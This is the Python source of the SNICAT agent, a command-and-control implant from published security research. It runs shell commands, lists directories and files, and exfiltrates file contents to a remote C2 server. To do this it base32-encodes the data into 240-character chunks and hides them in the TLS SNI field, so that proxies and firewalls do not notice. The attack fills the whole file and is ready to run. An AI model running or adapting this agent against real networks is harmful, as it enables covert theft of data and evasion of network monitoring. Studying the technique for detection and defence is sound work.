#!/usr/bin/python3

"""
SNICAT Agent
www.mnemonic.no
https://github.com/mnemonic-no/SNIcat
Author: Morten Marstrander, Matteo Malvica
"""

import ssl
import socket
from socket import error as SocketError
import sys
import time
import funcy
import subprocess
from subprocess import Popen
import os
import base64
import random
import string
import struct

def randomString(stringLength=16):
    """Generate a random string of fixed length
    We use this to randomize the SNI, in order for the proxy/NGFW to not present a cached certificate.
    """
    letters = string.ascii_lowercase
    lettersAndDigits = string.ascii_letters + string.digits
    return ''.join(random.choice(lettersAndDigits) for i in range(stringLength))

def generateAgentName(stringLength=6):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    lettersAndDigits = string.ascii_letters + string.digits
    rand = ''.join(random.choice(lettersAndDigits) for i in range(stringLength))
    agentName = "snicat-agent-" + rand
    return agentName

def subprocessCmd(command):
    # execute cmd and strip the output
    if log_enabled:
        print("issued command: %s" % command)
    process = subprocess.Popen(command,stdout=subprocess.PIPE, shell=True)
    proc_stdout = process.communicate()[0].strip()
    return proc_stdout

def encodeString(st):
    st = (str(st,'utf-8')).replace('\n','')
    return st

def createObjSocket(sni):
    # socket wrapper
    global port
    global c2_server
    
    sni_paylod = bytearray("%s%s" % (sni,good_cert_name), 'utf-8')
    context = ssl.create_default_context()
    context.options |= ssl.OP_NO_TLSv1_3
    l_onoff = 1
    l_linger = 0
    value = "OK"

    sobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sobj.settimeout(timeout)
    sobj.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', l_onoff, l_linger))

    try:
        sobj.connect((c2_server, port))
        ssobj = context.wrap_socket(sobj, server_hostname=sni_paylod)
        sobj.close()
    except SocketError as e:
        value = "Socket reset"
        if log_enabled:
            print(e)
    return value

def initCmd(cmd):
    global currentPath
    global currentDirList
    global currentFileList
    global currentFileSizeList
    global agentName

    if not currentFileList:
        currentFileList = subprocessCmd("ls -p | grep -v /")
    if not  currentFileSizeList:
        currentFileSizeList = subprocessCmd("ls -pl | grep -v / | awk '{print $5}'")
    if not currentPath:
        currentPath = (str(subprocessCmd("pwd"),'utf-8')).replace('\n','')

    if log_enabled:
        print("current cmd is %s\n" % cmd)
        print("current path is %s\n" %  currentPath)
        print("current dir list is %s\n" % currentDirList)
        print("current file list is %s\n" % currentFileList)

    commands = {"SIZE":"cd {};ls -pl | tr -s ' ' | grep -v / | cut -d' ' -f5",
                "WHERE":"cd {};pwd",
                "CD":"'cd {};cd %s;pwd'",
                "LS":"cd {};ls -p | grep -v /", 
                "LIST":"cd {};ls -ls  | awk '{{print $10,$6}}'",
                "CB":"cd {};cd ..;pwd",
                "LD":"cd {};ls -d */",
                "EX":'dummy',
                "ALIVE":agentName}
    return commands

def emptyListCheck(filelist):
    output = filelist.decode().split('\n')
    if "''" in str(output):
        filelist = "No files found / No directories found".encode('utf-8')
    return output,filelist

def cmdHandler(alias):
    global currentPath
    current = ('%s' % currentPath)
    alias = (alias).format(current)
    return subprocessCmd(alias)

def executeCmd(cmd,arg):
    """ the meat: how we react to the SNI-based logic and execute the underlying command """
    global currentPath
    global currentDirList
    global currentFileList
    global currentFileSizeList
    global agentName

    commands = initCmd(cmd)

    for testedCommand, alias in commands.items():
        if testedCommand == cmd == "WHERE":
            currentPath = encodeString(cmdHandler(alias))
            return cmdHandler(alias)
        elif testedCommand == cmd == 'CB':
            returnedOutput = cmdHandler(alias)
            currentPath = encodeString(returnedOutput)
            return returnedOutput
        elif testedCommand == cmd == 'ALIVE':
            return (str(agentName)).encode('utf-8')
        elif testedCommand == cmd == 'LS':
            returnedOutput = cmdHandler(alias)
            currentFileList,returnedOutput = emptyListCheck(returnedOutput)
            return returnedOutput
        elif testedCommand == cmd == 'SIZE':
            returnedOutput = cmdHandler(alias)
            currentFileSizeList = emptyListCheck(returnedOutput)
            return returnedOutput
        elif testedCommand == cmd == 'CD':
            try:
                target_dir = ('%s' % currentDirList[int(arg)])
            except IndexError:
                print("(!) Invalid directory number!")
                return
            alias = (alias % target_dir).replace("'","")
            returnedOutput = (cmdHandler(alias))
            currentPath = encodeString(returnedOutput)
            return returnedOutput
        elif testedCommand == cmd == 'EX':
            try:
                targetFile = ('%s' % currentFileList[int(arg)])
            except IndexError:
                print("(!) Invalid file number!")
                return
            targetFilePath = ('%s/%s' % (currentPath,targetFile))
            with open(targetFilePath, 'rb') as f:
                content = base64.b32encode(f.read())
            return content
        elif testedCommand == cmd == "LD":
            returnedOutput = cmdHandler(alias)
            currentDirList,returnedOutput = emptyListCheck(returnedOutput)
            return returnedOutput
        elif testedCommand == cmd == "LIST":
            returnedOutput = cmdHandler(alias)
            return returnedOutput

def sendSNIChunks(chunks):
    for chunk in chunks:
        try:    
            createObjSocket(chunk)   
        except ssl.SSLError as e:
            if log_enabled:
                print(e)
            if "unable to get local issuer" in str(e):
                createObjSocket(chunk)
                return
            return
        except(ConnectionResetError,OSError,Exception) as e:
            if log_enabled:
                print(e)
            continue
            
def sendSNIPayload(cmd,argument):
    """
    we know which server command will be executed at this point
    so we call the 'execute cmd' and encode the command output
    """
    randy = randomString()
    print("(*) Executing: %s command" % cmd)

    if not ("CD" or "EX") in cmd:
        payload = (executeCmd(cmd,0))
    else:
        payload = argument.encode('utf-8')

    encoded_payload = str(base64.b32encode(payload),"utf-8")

    if log_enabled:
        print(encoded_payload)

    encoded_payload = encoded_payload.replace("=",'')
    chunks = list(funcy.chunks(240, encoded_payload))
    finito = ("finito-%s" % randy)
    chunks.append(finito)

    if log_enabled:
        print(encoded_payload)
        print(chunks)

    sendSNIChunks(chunks)

def encodeSendFile(filecontent):
    """
    b32 encode the file and send 240 bytes of chunks 
    """
    payload = filecontent
    randy = randomString()
    encoded_payload = str(payload,"utf-8")
    chunks = list(funcy.chunks(240, encoded_payload))
    finito = ("finito-%s" % randy)
    chunks.append(finito)

    if log_enabled:
        print("sending [%d] chunks" % len(chunks))

    for i,chunk in enumerate(chunks):
        try:
            if log_enabled:
                print("sending chunk [%d]" %i)
            chunk = chunk.replace('=','')
            ret_value = createObjSocket(chunk)
            time.sleep(timeout)
        except (OSError,SSLError) as e:
            if log_enabled:
                print(e)
                print("sending chunk [%d]" %i)
            chunk = (chunks[i]).replace('=','')
            createObjSocket(chunk)
            time.sleep(timeout)
            pass
        except Exception as e:
            print(e)
            if log_enabled:
                print("sending chunk [%d]" %i)
            time.sleep(timeout)
            pass
    return

def scanList(cmd):
    """
    scan directory or file list in order to get the chosen one from c2
    """
    global port
    global c2_server
    
    print("(*) Executing: %s command" % cmd)

    for file_num in range(1000):
        randy = randomString()
        hostname = ("%s-%s%s" % (file_num,randy,good_cert_name))
        context = ssl.create_default_context()
        context.options |= ssl.OP_NO_TLSv1_3
        sobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        sobj.settimeout(timeout)
        time.sleep(timeout)

        if log_enabled:
            print("file number is: %s" %file_num)

        try:
            sobj.connect((c2_server, port))
        except ConnectionRefusedError as e:
            if log_enabled:
                print(e)
            pass

        try:
            ssobj = context.wrap_socket(sobj, server_hostname=hostname)
            file_content = executeCmd(cmd,file_num)
            if "EX" in cmd:
                encodeSendFile(file_content)
            return
        except ssl.SSLError as e:
            if log_enabled:
                print(e)
            if "unable to get local issuer" in str(e):
                file_content = executeCmd(cmd,file_num)

                if "EX" in cmd:
                    encodeSendFile(file_content)
                return 
            else:
                #we get the bad cert here
                continue
        except OSError as e:
                if log_enabled:
                    print(e)
                if not "Connection reset by peer" in str(e):
                    file_content = executeCmd(cmd,file_num)
                    if "EX" in cmd:
                        encodeSendFile(file_content)
                    return

def checkCDEX(command):
    if command == 'CD':
        scanList(command)
    elif command == 'EX':
        scanList(command)
    else:
        sendSNIPayload(command,0)
    return 

def sendSNIAndGetBit(sni):
    """
    Handling the good/bad cert sent by the server
    """
    global port
    global c2_server

    hostname = sni
    context = ssl.create_default_context()
    context.options |= ssl.OP_NO_TLSv1_3
    sobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sobj.settimeout(timeout)

    try:
        sobj.connect((c2_server, port))
    except ConnectionRefusedError as e:
        if log_enabled:
            pass
            #print(e)
        return

    try:
        command = str(sni).split('-')[0]
        ssobj = context.wrap_socket(sobj, server_hostname=hostname)
        checkCDEX(command)
    except ssl.SSLError as e:
        # this exception is needed in case the cert is not installed in local store
        if "unable to get local issuer" in str(e):
            command = str(sni).split('-')[0]
            time.sleep(timeout)
            checkCDEX(command)
    except OSError as e:
        # exception needed when *a specific vendor*  close the connections after a successfull handshake with good cert
        if not "Connection reset by peer" in str(e):
            checkCDEX(command)

def fire(commands):
    # loop every command and send SNI + value to the c2
    if log_enabled:
        print("Loooping through every command")
    while True:
        for cmd in commands:
            time.sleep(timeout)
            sys.stdout.flush()
            randy = randomString()

            try:
                command = str(sendSNIAndGetBit("%s-%s%s" % (cmd,randy,good_cert_name))).split('-')[0]
            except socket.timeout as e:
                if log_enabled:
                    print("(!) Connection error...retrying soon")
                time.sleep(timeout)

def agentBanner():
    print("""\n ######################################################""")
    print(""" ###   SNICAT C2 AGENT                              ###""")
    print(""" ###   by Morten Marstrander & Matteo Malvica       ###""")
    print(""" ######################################################""")
    print("""\n\t"the not-so-advertized TLS feature"\n """)

def main():
    global port
    global c2_server
    global currentPath
    global currentFileList
    global currentDirList
    global currentFileSizeList
    global agentName
    global log_enabled
    global good_cert_name
    global timeout

    commands = ['LIST','SIZE','LD','WHERE','CD','CB','LS','EX','ALIVE']

    log_enabled = False
    agentName = generateAgentName()
    currentPath = ''
    currentFileList = []
    currentFileSizeList = []
    currentDirList = []

    if len(sys.argv) < 5:
        print("\n(*) USAGE:\t 'python3 %s c2_server_ip c2_server_port good_cert_name log=[on|off] timeout=[timeout in seconds - default is 0.5]'\n" % sys.argv[0])
        print("(*) Example:\t 'python3 %s 192.0.2.1 443 .sni.cat log=off timeout=1'\n" % sys.argv[0])
        sys.exit()

    agentBanner()

    print("(*) - IDLE - waiting for C2...")
    port = int(sys.argv[2])
    good_cert_name = str(sys.argv[3])
    log_var = (sys.argv[4].split('='))[1]

    if len(sys.argv) <6 :
        timeout = 0.5
    else:
        try:
            timeout = float((sys.argv[5].split('='))[1])
        except Exception:
            print("(!) malformed 'timeout' value - quitting...")
            sys.exit()
    if "on" in log_var:
        log_enabled = True

    c2_server = sys.argv[1]
    fire(commands)

if '__main__' == __name__:
    main()
